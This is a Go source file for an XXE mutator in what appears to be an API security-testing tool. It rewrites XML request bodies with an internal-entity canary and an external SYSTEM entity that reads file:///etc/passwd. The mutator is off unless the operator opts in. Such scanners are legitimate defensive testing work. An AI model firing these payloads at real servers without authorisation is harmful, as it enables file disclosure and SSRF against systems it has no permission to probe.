package mutate

import (
	"sort"
	"strings"

	"github.com/bugsyhewitt/possession/internal/model"
)

// XXE is the XML External Entity injection mutator (POST_V01 R18: OWASP API
// #8-adjacent / OWASP Top-10 A05 XXE). It targets APIs that accept XML request
// bodies and tests whether the server's XML parser resolves external/internal
// entities — the root cause of file disclosure, SSRF, and DoS via XXE.
//
// Where SwapIdentity attacks *who* the caller is, SwapObject attacks *which*
// object is referenced, and MassAssign attacks *which properties* are bound,
// XXE attacks *how the request body itself is parsed*. It keeps the caller's
// own credentials untouched (Identity == nil) and rewrites the XML body to
// carry a malicious DOCTYPE, then watches for evidence the parser expanded the
// entity.
//
// Detection (handled in internal/detect): each variant carries a unique canary
// string in Mutation.Detail["xxe-canary"]. The canary is the value of an
// internal entity referenced inside the document; if the server reflects that
// canary back in its response, the parser MUST have expanded the entity ⇒ XXE
// is confirmed with near-certainty. This in-band, reflection-based signal sits
// outside the comparative ladder (XXE has no owner/actor baseline), so the
// evaluator gates it on the canary detail rather than on response similarity.
//
// XML detection is by content type ("xml") or body shape (leading "<?xml" or
// "<"). Non-XML bodies (JSON, form-encoded, empty) produce no variants.
//
// Like every mutator, Generate is pure and deterministic: payload techniques
// are emitted in a fixed (sorted-by-name) order and the canary derives only
// from the base request's deterministic ID, so identical inputs yield an
// identical variant slice.
//
// XXE is OFF by default (Enabled == false). The payloads are write-shaped
// against the parser and the SYSTEM-entity variant deliberately probes for
// local-file / SSRF resolution, so it only fires when the operator explicitly
// opts in via --xxe. This mirrors the off-by-default gating of MassAssign
// (state-mutating), EnumerateID (rate-sensitive), and JWTAuth (forgery).
type XXE struct {
	Enabled bool
}

func (XXE) Name() string { return "xxe" }

// xxeCanaryPrefix marks the unique reflection token injected into every XXE
// variant. The full canary is this prefix plus the base request's deterministic
// ID, so the canary is unique per endpoint and stable across runs — exactly
// what the detection branch needs to attribute a reflection to one variant.
const xxeCanaryPrefix = "possession-xxe-"

// xxeTechnique is one XXE payload strategy. Each emits a separate variant so
// the comparative reporter can attribute a confirmed hit to the precise parser
// behaviour that resolved.
type xxeTechnique struct {
	// name is a stable identifier used in Mutation.Detail and ordering.
	name string
	// doctype builds the inline DOCTYPE block given the canary value. The
	// returned string is spliced ahead of the document root and the entity it
	// defines is referenced from inside the root element by injectEntityRef.
	doctype func(canary string) string
	// entityRef is the entity reference spliced into the document body so the
	// parser is forced to expand the defined entity (and thus reflect the
	// canary, for the internal-entity technique).
	entityRef string
}

// xxeTechniques is the built-in payload set. Kept small and high-signal:
//   - "internal-entity": defines an internal general entity whose value is the
//     canary and references it. A parser that resolves entities reflects the
//     canary verbatim ⇒ decisive, false-positive-free confirmation that entity
//     expansion is enabled (the prerequisite for every XXE class).
//   - "external-system": defines an external SYSTEM entity pointing at a local
//     file (file:///etc/passwd) and references it. This is the classic
//     file-disclosure probe; it has no canary (the reflected content is the
//     file, judged by the comparative differential), so detection relies on the
//     response differing from the entity-stripped baseline rather than on a
//     canary match.
//
// Sorted by name so generation order is deterministic without a sort at call
// time; the order test covers this.
var xxeTechniques = []xxeTechnique{
	{
		name: "external-system",
		doctype: func(string) string {
			return `<!DOCTYPE possession [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
		},
		entityRef: "&xxe;",
	},
	{
		name: "internal-entity",
		doctype: func(canary string) string {
			return `<!DOCTYPE possession [<!ENTITY xxe "` + canary + `">]>`
		},
		entityRef: "&xxe;",
	},
}

func (x XXE) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
	if !x.Enabled || base == nil {
		return nil
	}
	if len(base.Body) == 0 || !looksXML(base.ContentType, base.Body) {
		return nil
	}

	body := string(base.Body)
	// The body must have a recognizable XML root we can inject an entity
	// reference into; if we can't locate one, we don't emit (no blind
	// best-effort payloads — keep the false-positive surface zero).
	rootStart, rootEnd, ok := firstElementContent(body)
	if !ok {
		return nil
	}

	canary := xxeCanaryPrefix + base.ID

	techs := append([]xxeTechnique(nil), xxeTechniques...)
	sort.Slice(techs, func(i, j int) bool { return techs[i].name < techs[j].name })

	var out []model.Variant
	for _, t := range techs {
		mutated := buildXXEBody(body, rootStart, rootEnd, t.doctype(canary), t.entityRef)
		if mutated == "" {
			continue
		}

		req := CloneRequest(base)
		req.Body = []byte(mutated)
		// Force an XML content type if the original lacked one — some parsers
		// only resolve entities when told the body is XML.
		if req.Headers != nil && !strings.Contains(strings.ToLower(req.ContentType), "xml") {
			req.Headers.Set("Content-Type", "application/xml")
			req.ContentType = "application/xml"
		}

		detail := map[string]string{
			"technique": t.name,
		}
		// Only the internal-entity technique has a reflectable canary; the
		// external-system technique is judged by the comparative differential.
		if t.name == "internal-entity" {
			detail["xxe-canary"] = canary
		}

		out = append(out, model.Variant{
			Base:     req,
			Identity: nil, // credentials unchanged — caller stays the captured owner
			Mutation: model.Mutation{
				Type:        "xxe",
				Description: "inject XML external/internal entity (" + t.name + ") into request body",
				Detail:      detail,
				Class:       "xxe-injection",
			},
		})
	}
	return out
}

// buildXXEBody splices a DOCTYPE ahead of the document and an entity reference
// into the first element's content. rootStart/rootEnd delimit the byte range of
// the first element's text content (between its open and close tags). The
// DOCTYPE is inserted immediately before the root element's opening tag. Any
// pre-existing DOCTYPE in the original body is stripped first so we don't emit a
// document with two DOCTYPEs (invalid, and the second would be ignored).
func buildXXEBody(body string, rootStart, rootEnd int, doctype, entityRef string) string {
	stripped, shift := stripDoctype(body)
	rootStart += shift
	rootEnd += shift
	if rootStart < 0 || rootEnd < rootStart || rootEnd > len(stripped) {
		return ""
	}

	// Find where the root element's opening tag begins so the DOCTYPE lands
	// just before it (after any XML declaration / prolog).
	openTagStart := strings.LastIndex(stripped[:rootStart], "<")
	if openTagStart < 0 {
		return ""
	}

	var b strings.Builder
	b.WriteString(stripped[:openTagStart])
	b.WriteString(doctype)
	// Reference the entity at the start of the root element's content so it is
	// always inside a valid element and forced to expand.
	b.WriteString(stripped[openTagStart:rootStart])
	b.WriteString(entityRef)
	b.WriteString(stripped[rootStart:])
	return b.String()
}

// firstElementContent returns the byte offsets [start,end) of the text content
// inside the first XML element of body (i.e. between the first ">" that closes
// an opening tag and the next "<" that opens the following tag). ok is false if
// no usable element is found. The XML declaration (<?xml ... ?>) and comments
// are skipped so the injection lands in real element content.
func firstElementContent(body string) (start, end int, ok bool) {
	i := 0
	for i < len(body) {
		lt := strings.IndexByte(body[i:], '<')
		if lt < 0 {
			return 0, 0, false
		}
		lt += i
		// Skip XML declaration, processing instructions, comments, DOCTYPE.
		if strings.HasPrefix(body[lt:], "<?") ||
			strings.HasPrefix(body[lt:], "<!--") ||
			strings.HasPrefix(body[lt:], "<!") {
			gt := strings.IndexByte(body[lt:], '>')
			if gt < 0 {
				return 0, 0, false
			}
			i = lt + gt + 1
			continue
		}
		// Real element opening tag. Find the end of the opening tag.
		gt := strings.IndexByte(body[lt:], '>')
		if gt < 0 {
			return 0, 0, false
		}
		openClose := lt + gt
		// Self-closing tag (<foo/>) has no content to inject into; skip.
		if openClose > 0 && body[openClose-1] == '/' {
			i = openClose + 1
			continue
		}
		contentStart := openClose + 1
		// Content runs until the next "<" (a child element or the close tag).
		next := strings.IndexByte(body[contentStart:], '<')
		if next < 0 {
			// No closing tag — malformed; bail.
			return 0, 0, false
		}
		contentEnd := contentStart + next
		return contentStart, contentEnd, true
	}
	return 0, 0, false
}

// stripDoctype removes a leading/embedded <!DOCTYPE ...> declaration from body
// and returns the result plus the byte shift (negative or zero) applied to
// offsets after the removed region. If no DOCTYPE is present the body is
// returned unchanged with a zero shift.
func stripDoctype(body string) (string, int) {
	low := strings.ToLower(body)
	idx := strings.Index(low, "<!doctype")
	if idx < 0 {
		return body, 0
	}
	end := strings.IndexByte(body[idx:], '>')
	if end < 0 {
		return body, 0
	}
	end = idx + end + 1
	stripped := body[:idx] + body[end:]
	return stripped, -(end - idx)
}

// looksXML reports whether the content type or the body shape indicates XML.
func looksXML(contentType string, body []byte) bool {
	if strings.Contains(strings.ToLower(contentType), "xml") {
		return true
	}
	trimmed := strings.TrimSpace(string(body))
	if strings.HasPrefix(trimmed, "<?xml") {
		return true
	}
	// A bare leading "<" that is NOT JSON-ish; require it to look like a tag
	// (next rune is a letter or "/") to avoid misclassifying odd payloads.
	if strings.HasPrefix(trimmed, "<") && len(trimmed) > 1 {
		c := trimmed[1]
		if c == '/' || c == '!' || c == '?' || (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') {
			return true
		}
	}
	return false
}
